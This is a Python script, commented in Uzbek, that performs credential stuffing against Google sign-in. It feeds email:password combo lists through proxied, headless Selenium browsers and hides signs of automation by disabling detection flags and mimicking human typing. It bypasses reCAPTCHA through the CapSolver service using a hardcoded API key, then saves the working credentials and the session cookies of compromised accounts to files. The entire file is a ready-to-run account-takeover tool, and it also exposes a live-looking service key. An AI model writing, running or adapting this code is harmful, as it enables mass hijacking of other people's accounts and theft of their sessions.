import sys
import os
import json
import time
import random
import requests
import re
import pyperclip
from datetime import datetime
from typing import List, Tuple, Dict, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.action_chains import ActionChains

try:
    from webdriver_manager.chrome import ChromeDriverManager
except ImportError:
    os.system("pip install webdriver-manager")
    from webdriver_manager.chrome import ChromeDriverManager

try:
    import pyperclip
except ImportError:
    os.system("pip install pyperclip")
    import pyperclip

# ═══════════════════════════════════════════════════
# SOZLAMALAR
# ═══════════════════════════════════════════════════
CAPSOLVER_API_KEY = "CAP-B325874812AC3FA9BCFCC90D448963EAFE5C5508BD3E96EBDB47B5BF9927635B"
CAPSOLVER_TIMEOUT = 120
CAPSOLVER_POLL_INTERVAL = 3
COMBO_FILE = "combo.txt"
PROXY_FILE = "proxies.txt"
THREADS = 10
HEADLESS = True
# ═══════════════════════════════════════════════════

# Ranglar
G = '\033[92m'
R = '\033[91m'
Y = '\033[93m'
M = '\033[95m'
C = '\033[96m'
W = '\033[97m'
B = '\033[1m'
RST = '\033[0m'


class CapSolverHandler:
    def __init__(self, api_key):
        self.api_key = api_key
        self.base_url = "https://api.capsolver.com"
    
    def solve_recaptcha_v2(self, sitekey, page_url):
        try:
            r = requests.post(f"{self.base_url}/createTask", json={
                "clientKey": self.api_key,
                "task": {"type": "ReCaptchaV2TaskProxyless", "websiteURL": page_url, "websiteKey": sitekey}
            }, timeout=10)
            res = r.json()
            if res.get("errorId") != 0:
                return None
            return self._poll(res.get("taskId"))
        except:
            return None
    
    def _poll(self, task_id):
        if not task_id:
            return None
        start = time.time()
        while (time.time() - start) < CAPSOLVER_TIMEOUT:
            try:
                r = requests.post(f"{self.base_url}/getTaskResult", json={"clientKey": self.api_key, "taskId": task_id}, timeout=10)
                res = r.json()
                if res.get("status") == "ready":
                    return res.get("solution", {}).get("gRecaptchaResponse")
                time.sleep(CAPSOLVER_POLL_INTERVAL)
            except:
                time.sleep(CAPSOLVER_POLL_INTERVAL)
        return None


class CaptchaDetector:
    @staticmethod
    def is_visible(driver):
        """Captcha ko'rinishini aniqlash"""
        try:
            try:
                pf = driver.find_element(By.CSS_SELECTOR, "input[type='password']")
                if pf.is_displayed():
                    return (False, None)
            except:
                pass
            
            # reCAPTCHA iframe
            try:
                iframes = driver.find_elements(By.CSS_SELECTOR, "iframe[src*='recaptcha']")
                for ifr in iframes:
                    if ifr.is_displayed() and ifr.size['width'] > 0:
                        return (True, CaptchaDetector._sitekey(driver))
            except:
                pass
            
            # g-recaptcha div
            try:
                divs = driver.find_elements(By.CSS_SELECTOR, ".g-recaptcha")
                for d in divs:
                    if d.is_displayed():
                        return (True, d.get_attribute("data-sitekey") or CaptchaDetector._sitekey(driver))
            except:
                pass
            
            # "I'm not a robot" matni
            try:
                body = driver.find_element(By.TAG_NAME, "body").text.lower()
                if "i'm not a robot" in body or "im not a robot" in body:
                    return (True, CaptchaDetector._sitekey(driver))
            except:
                pass
            
            return (False, None)
        except:
            return (False, None)
    
    @staticmethod
    def _sitekey(driver):
        try:
            els = driver.find_elements(By.CSS_SELECTOR, "[data-sitekey]")
            if els:
                return els[0].get_attribute("data-sitekey")
            iframes = driver.find_elements(By.TAG_NAME, "iframe")
            for i in iframes:
                src = i.get_attribute("src") or ""
                if "recaptcha" in src.lower():
                    m = re.search(r'[?&]k=([^&]+)', src)
                    if m:
                        return m.group(1)
        except:
            pass
        return None
    
    @staticmethod
    def status_after_email(driver):
        try:
            url = driver.current_url
            text = driver.page_source.lower()
            
            if "this browser or app may not be secure" in text:
                return "blocked"
            if "couldn't find your google account" in text:
                return "invalid"
            
            # Captcha tekshirish (avval!)
            is_cap, _ = CaptchaDetector.is_visible(driver)
            if is_cap:
                return "captcha"
            
            # Parol maydoni
            try:
                pf = driver.find_element(By.NAME, "password")
                if pf.is_displayed():
                    return "password"
            except:
                pass
            
            try:
                pfs = driver.find_elements(By.CSS_SELECTOR, "input[type='password']")
                for pf in pfs:
                    if pf.is_displayed():
                        return "password"
            except:
                pass
            
            if "enter your password" in text:
                return "password"
            if "challenge/pwd" in url:
                return "password"
            
            if "challenge" in url and "pwd" not in url:
                if "2-step" in text or "verification" in text:
                    return "2fa"
            
            if "identifier" in url:
                return "unknown"
            
            return "unknown"
        except:
            return "unknown"
    
    @staticmethod
    def status_after_password(driver):
        try:
            url = driver.current_url
            text = driver.page_source.lower()
            
            if url.startswith("https://myaccount.google.com"):
                return "valid"
            if "myaccount.google.com" in url and "signin" not in url:
                return "valid"
            
            if "challenge" in url and "pwd" not in url:
                if "2-step" in text or "verification" in text:
                    return "2fa"
            
            if "this browser or app may not be secure" in text:
                return "blocked"
            if "wrong password" in text or "incorrect password" in text:
                return "invalid"
            if "couldn't sign you in" in text:
                return "invalid"
            if "signin" in url:
                return "invalid"
            
            is_cap, _ = CaptchaDetector.is_visible(driver)
            if is_cap:
                return "captcha"
            
            return "unknown"
        except:
            return "unknown"


class HumanBehavior:
    @staticmethod
    def type_email(el, email, typo_chance=0.4):
        """Email 5 sekundda kiritiladi, 1-2 xato bilan"""
        email = email.strip()
        if random.random() < typo_chance:
            pos = random.randint(0, len(email) - 1)
            typo = email[:pos] + email[pos].upper() + email[pos+1:]
            for i, ch in enumerate(typo):
                el.send_keys(ch)
                time.sleep(random.uniform(0.06, 0.10))
                if i == pos:
                    time.sleep(random.uniform(0.2, 0.4))
                    el.send_keys(Keys.BACKSPACE)
                    time.sleep(random.uniform(0.15, 0.3))
                    el.send_keys(email[pos])
                    time.sleep(random.uniform(0.08, 0.15))
        else:
            for ch in email:
                el.send_keys(ch)
                time.sleep(random.uniform(0.06, 0.10))
    
    @staticmethod
    def type_password(el, password):
        """Parol tez kiritiladi"""
        password = password.strip()
        for ch in password:
            el.send_keys(ch)
            time.sleep(random.uniform(0.02, 0.05))
    
    @staticmethod
    def paste_code(driver, code):
        """Kodni copy qilib tashlash"""
        try:
            pyperclip.copy(code)
            # Focus on code input
            try:
                code_field = driver.find_element(By.CSS_SELECTOR, "input[type='tel'], input[type='text']")
                if code_field.is_displayed():
                    code_field.click()
                    time.sleep(0.2)
                    code_field.send_keys(Keys.CONTROL, 'v')
                    return True
            except:
                pass
        except:
            pass
        return False
    
    @staticmethod
    def pause(min_s=0.3, max_s=0.8):
        time.sleep(random.uniform(min_s, max_s))


class ProxyManager:
    def __init__(self, proxy_file=None):
        self.proxies = []
        if proxy_file and os.path.exists(proxy_file):
            try:
                with open(proxy_file, 'r') as f:
                    self.proxies = [l.strip() for l in f if l.strip()]
            except:
                pass
        self.idx = 0
        self.lock = threading.Lock()
    
    def get(self):
        if not self.proxies:
            return None
        with self.lock:
            p = self.proxies[self.idx % len(self.proxies)]
            self.idx += 1
            return p


class GoogleChecker:
    def __init__(self, proxy_file=None, threads=10, timeout=60, headless=True):
        self.timeout = timeout
        self.threads = threads
        self.headless = headless
        self.proxy_mgr = ProxyManager(proxy_file)
        self.capsolver = CapSolverHandler(CAPSOLVER_API_KEY)
        
        self.lock = threading.Lock()
        self.valid_count = 0
        self.invalid_count = 0
        self.twofa_count = 0
        self.captcha_count = 0
        self.blocked_count = 0
        self.error_count = 0
        self.checked_count = 0
        
        self.results_dir = "results"
        os.makedirs(self.results_dir, exist_ok=True)
        
        self.login_url = "https://accounts.google.com/v3/signin/identifier?authuser=0&continue=https://myaccount.google.com/&ec=GAlAwAE&hl=en&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S354241706:1790376665963573"
        self.cookies_data = []
    
    def create_driver(self, proxy=None):
        opts = Options()
        if self.headless:
            opts.add_argument("--headless=new")
        if proxy:
            opts.add_argument(f"--proxy-server=http://{proxy}")
        opts.add_argument("--no-sandbox")
        opts.add_argument("--disable-dev-shm-usage")
        opts.add_argument("--disable-blink-features=AutomationControlled")
        opts.add_argument("--window-size=1280,900")
        opts.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        opts.add_argument("--disable-extensions")
        opts.add_argument("--disable-gpu")
        opts.add_argument("--log-level=3")
        opts.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
        opts.add_experimental_option('useAutomationExtension', False)
        try:
            service = Service(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=opts)
            driver.set_page_load_timeout(self.timeout)
            return driver
        except:
            return None
    
    def get_cookies(self, driver):
        try:
            return {c['name']: c['value'] for c in driver.get_cookies() if 'name' in c}
        except:
            return {}
    
    def find_password_field(self, driver):
        # Usul 1
        try:
            fields = driver.find_elements(By.CSS_SELECTOR, "input[type='password']")
            for f in fields:
                if f.is_displayed():
                    return f
        except:
            pass
        # Usul 2
        try:
            f = driver.find_element(By.NAME, "password")
            if f.is_displayed():
                return f
        except:
            pass
        # Usul 3
        try:
            f = driver.find_element(By.ID, "password")
            if f.is_displayed():
                return f
        except:
            pass
        # Usul 4: JS
        try:
            f = driver.execute_script("""
                var inputs = document.querySelectorAll('input[type="password"]');
                for (var i = 0; i < inputs.length; i++) {
                    if (inputs[i].offsetParent !== null) return inputs[i];
                }
                return null;
            """)
            if f:
                return f
        except:
            pass
        return None
    
    def find_next_button(self, driver):
        try:
            b = driver.find_element(By.ID, "passwordNext")
            if b.is_displayed():
                return b
        except:
            pass
        try:
            b = driver.find_element(By.CSS_SELECTOR, "button[jsname='V67aGc']")
            if b.is_displayed():
                return b
        except:
            pass
        try:
            b = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
            if b.is_displayed():
                return b
        except:
            pass
        try:
            for b in driver.find_elements(By.TAG_NAME, "button"):
                if b.is_displayed() and b.text.strip().lower() == "next":
                    return b
        except:
            pass
        try:
            b = driver.execute_script("""
                var buttons = document.querySelectorAll('button, div[role="button"]');
                for (var i = 0; i < buttons.length; i++) {
                    var t = (buttons[i].innerText || '').trim().toLowerCase();
                    if (t === 'next' && buttons[i].offsetParent !== null) return buttons[i];
                }
                return null;
            """)
            if b:
                return b
        except:
            pass
        return None
    
    def click_captcha_checkbox(self, driver):
        """CAPTCHA checkbox'ni bosish - 'I'm not a robot' chap tomonidagi katak"""
        try:
            # Usul 1: reCAPTCHA iframe ichiga kirish
            iframes = driver.find_elements(By.CSS_SELECTOR, "iframe[src*='recaptcha']")
            for ifr in iframes:
                if ifr.is_displayed():
                    try:
                        driver.switch_to.frame(ifr)
                        # Checkbox elementini topish
                        checkbox = driver.find_elements(By.CSS_SELECTOR, "#recaptcha-anchor, .recaptcha-checkbox")
                        if checkbox:
                            for cb in checkbox:
                                if cb.is_displayed():
                                    cb.click()
                                    time.sleep(0.5)
                                    driver.switch_to.default_content()
                                    return True
                        driver.switch_to.default_content()
                    except:
                        driver.switch_to.default_content()
            
            # Usul 2: Koordinata bo'yicha - "I'm not a robot" matnidan chapga
            body_text = driver.find_element(By.TAG_NAME, "body").text
            if "i'm not a robot" in body_text.lower():
                try:
                    # "I'm not a robot" elementini topish
                    label = driver.find_element(By.XPATH, "//*[contains(text(), \"I'm not a robot\")]")
                    loc = label.location
                    size = label.size
                    
                    # Chapga 10-40% siljish
                    for percent in [10, 20, 30, 40]:
                        click_x = loc['x'] - int(size['width'] * percent / 100) - 30
                        click_y = loc['y'] + size['height'] // 2
                        
                        if click_x < 0:
                            continue
                        
                        ActionChains(driver).move_by_offset(click_x, click_y).click().perform()
                        time.sleep(0.5)
                        
                        # Rasm o'zgarganini tekshirish
                        try:
                            body_after = driver.find_element(By.TAG_NAME, "body").text.lower()
                            if "i'm not a robot" not in body_after:
                                return True
                        except:
                            pass
                except:
                    pass
            
            return False
        except:
            return False
    
    def handle_captcha(self, driver, url, retry=0):
        """CAPTCHA ni yechish"""
        if retry >= 3:
            return False
        
        try:
            is_cap, sitekey = CaptchaDetector.is_visible(driver)
            if not is_cap:
                return True
            
            # 1. Checkbox'ni bosish
            if self.click_captcha_checkbox(driver):
                time.sleep(2)
                # Rasm chiqqanini tekshirish
                is_cap, sitekey = CaptchaDetector.is_visible(driver)
                if not is_cap:
                    return True
            
            # 2. CapSolver bilan yechish
            if sitekey:
                token = self.capsolver.solve_recaptcha_v2(sitekey, url)
                if token:
                    try:
                        driver.execute_script(f"""
                            document.getElementById('g-recaptcha-response').innerHTML = '{token}';
                            if (typeof ___grecaptcha_cfg !== 'undefined') {{
                                Object.keys(___grecaptcha_cfg.clients).forEach(function(k) {{
                                    var c = ___grecaptcha_cfg.clients[k];
                                    if (c.callback) c.callback('{token}');
                                }});
                            }}
                        """)
                        time.sleep(2)
                        return True
                    except:
                        pass
            
            # 3. Qayta urinish
            time.sleep(2)
            return self.handle_captcha(driver, url, retry + 1)
        except:
            return False
    
    def check_combo(self, combo):
        parts = combo.strip().split(":")
        if len(parts) < 2:
            return (False, combo, "invalid_format", {}, None)
        
        email = parts[0]
        password = ":".join(parts[1:])
        proxy = self.proxy_mgr.get()
        
        driver = None
        try:
            driver = self.create_driver(proxy)
            if not driver:
                return (False, combo, "error", {}, proxy)
            
            try:
                driver.get(self.login_url)
                HumanBehavior.pause(1, 2)
            except:
                return (False, combo, "error", {}, proxy)
            
            # ═══════ EMAIL ═══════
            try:
                email_field = WebDriverWait(driver, self.timeout).until(
                    EC.presence_of_element_located((By.ID, "identifierId"))
                )
                HumanBehavior.pause(0.3, 0.6)
                email_field.click()
                HumanBehavior.pause(0.2, 0.4)
                HumanBehavior.type_email(email_field, email, typo_chance=0.4)
                HumanBehavior.pause(0.3, 0.6)
                driver.find_element(By.ID, "identifierNext").click()
                time.sleep(random.uniform(4, 6))
            except:
                return (False, combo, "error", {}, proxy)
            
            # CAPTCHA tekshirish (email dan keyin)
            status = CaptchaDetector.status_after_email(driver)
            
            if status == "blocked":
                return (False, combo, "blocked", {}, proxy)
            elif status == "invalid":
                return (False, combo, "invalid", {}, proxy)
            elif status == "2fa":
                return (True, combo, "2fa", self.get_cookies(driver), proxy)
            elif status == "captcha":
                # CAPTCHA ni yechish
                if not self.handle_captcha(driver, driver.current_url):
                    return (False, combo, "captcha", {}, proxy)
                time.sleep(3)
                status = CaptchaDetector.status_after_email(driver)
                if status == "captcha":
                    return (False, combo, "captcha", {}, proxy)
                elif status == "invalid":
                    return (False, combo, "invalid", {}, proxy)
                elif status == "password":
                    pass
                else:
                    return (False, combo, "captcha", {}, proxy)
            
            # ═══════ PASSWORD ═══════
            try:
                password_field = self.find_password_field(driver)
                if not password_field:
                    time.sleep(1)
                    password_field = self.find_password_field(driver)
                    if not password_field:
                        return (False, combo, "error", {}, proxy)
                
                try:
                    password_field.click()
                except:
                    ActionChains(driver).move_to_element(password_field).click().perform()
                
                HumanBehavior.pause(0.2, 0.4)
                HumanBehavior.type_password(password_field, password)
                HumanBehavior.pause(0.3, 0.6)
                
                next_button = self.find_next_button(driver)
                if next_button:
                    try:
                        next_button.click()
                    except:
                        ActionChains(driver).move_to_element(next_button).click().perform()
                else:
                    password_field.send_keys(Keys.RETURN)
                
                time.sleep(random.uniform(4, 6))
            except:
                return (False, combo, "error", {}, proxy)
            
            # CAPTCHA tekshirish (parol dan keyin)
            status = CaptchaDetector.status_after_password(driver)
            
            if status == "captcha":
                if not self.handle_captcha(driver, driver.current_url):
                    return (False, combo, "captcha", {}, proxy)
                time.sleep(3)
                status = CaptchaDetector.status_after_password(driver)
            
            # ═══════ KOD YOZISH SAHIFASI (agar chiqsa) ═══════
            if "challenge" in driver.current_url and "totp" in driver.current_url.lower():
                # Kod yozish kerak — lekin bizda kod yo'q, shuning uchun 2FA deb belgilaymiz
                return (True, combo, "2fa", self.get_cookies(driver), proxy)
            
            if status == "valid":
                return (True, combo, "valid", self.get_cookies(driver), proxy)
            elif status == "2fa":
                return (True, combo, "2fa", self.get_cookies(driver), proxy)
            elif status == "blocked":
                return (False, combo, "blocked", {}, proxy)
            elif status == "invalid":
                return (False, combo, "invalid", {}, proxy)
            
            return (False, combo, "invalid", {}, proxy)
        except:
            return (False, combo, "error", {}, proxy)
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass
    
    def load_combos(self, filename):
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                return [l.strip() for l in f if l.strip()]
        except:
            print(f"{R}Error: {filename} topilmadi{RST}")
            sys.exit(1)
    
    def print_result(self, idx, email, status):
        if status == "valid":
            color, label = G, "VALID"
        elif status == "invalid":
            color, label = R, "INVALID"
        elif status == "2fa":
            color, label = Y, "2FA"
        elif status == "captcha":
            color, label = M, "CAPTCHA"
        elif status == "blocked":
            color, label = Y, "BLOCKED"
        else:
            color, label = C, "ERROR"
        
        num = f"{B}{W}{idx:>3}{RST}"
        email_disp = f"{W}{email:<40}{RST}"
        print(f"  {num}  {email_disp} {color}{label}{RST}")
    
    def check_batch(self, combos):
        results = {"valid": [], "invalid": [], "2fa": [], "captcha": [], "blocked": [], "error": []}
        
        print(f"\n{B}{C}{'═'*75}{RST}")
        print(f"{B}{C}  GOOGLE CHECKER  —  {len(combos)} accounts  —  {self.threads} threads{RST}")
        print(f"{B}{C}{'═'*75}{RST}\n")
        
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(self.check_combo, c): c for c in combos}
            
            for fut in as_completed(futures):
                is_valid, combo, status, cookies, proxy = fut.result()
                email = combo.split(":")[0]
                
                with self.lock:
                    self.checked_count += 1
                    idx = self.checked_count
                    
                    if status == "valid":
                        self.valid_count += 1
                        results["valid"].append((combo, cookies, proxy))
                        if cookies:
                            self.cookies_data.append({"email": email, "cookies": cookies, "time": datetime.now().isoformat()})
                    elif status == "2fa":
                        self.twofa_count += 1
                        results["2fa"].append((combo, cookies, proxy))
                    elif status == "blocked":
                        self.blocked_count += 1
                        results["blocked"].append(combo)
                    elif status == "captcha":
                        self.captcha_count += 1
                        results["captcha"].append(combo)
                    elif status == "invalid":
                        self.invalid_count += 1
                        results["invalid"].append(combo)
                    else:
                        self.error_count += 1
                        results["error"].append(combo)
                    
                    self.print_result(idx, email, status)
        
        self.print_summary()
        self.save_results(results)
    
    def print_summary(self):
        print(f"\n{B}{C}{'═'*75}{RST}")
        print(f"{B}{W}  NATIJA{RST}")
        print(f"{B}{C}{'═'*75}{RST}")
        print(f"  {G}{B}VALID   : {self.valid_count}{RST}")
        print(f"  {R}{B}INVALID : {self.invalid_count}{RST}")
        print(f"  {Y}{B}2FA     : {self.twofa_count}{RST}")
        print(f"  {M}{B}CAPTCHA : {self.captcha_count}{RST}")
        print(f"  {Y}{B}BLOCKED : {self.blocked_count}{RST}")
        print(f"  {C}{B}ERROR   : {self.error_count}{RST}")
        print(f"{B}{C}{'═'*75}{RST}\n")
    
    def save_results(self, results):
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        if results["valid"]:
            with open(os.path.join(self.results_dir, f"valid_{ts}.txt"), 'w') as f:
                for c, _, _ in results["valid"]:
                    f.write(f"{c}\n")
        if results["2fa"]:
            with open(os.path.join(self.results_dir, f"2fa_{ts}.txt"), 'w') as f:
                for c, _, _ in results["2fa"]:
                    f.write(f"{c}\n")
        if results["invalid"]:
            with open(os.path.join(self.results_dir, f"invalid_{ts}.txt"), 'w') as f:
                for c in results["invalid"]:
                    f.write(f"{c}\n")
        if self.cookies_data:
            with open(os.path.join(self.results_dir, f"cookies_{ts}.json"), 'w') as f:
                json.dump(self.cookies_data, f, indent=2)


def main():
    if not os.path.exists(COMBO_FILE):
        print(f"{R}Error: {COMBO_FILE} topilmadi{RST}")
        sys.exit(1)
    
    proxy = PROXY_FILE if os.path.exists(PROXY_FILE) else None
    
    checker = GoogleChecker(proxy, threads=THREADS, timeout=60, headless=HEADLESS)
    combos = checker.load_combos(COMBO_FILE)
    
    if not combos:
        print(f"{R}Error: combo.txt bo'sh{RST}")
        sys.exit(1)
    
    checker.check_batch(combos)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}To'xtatildi{RST}")
    except Exception as e:
        print(f"{R}Error: {e}{RST}")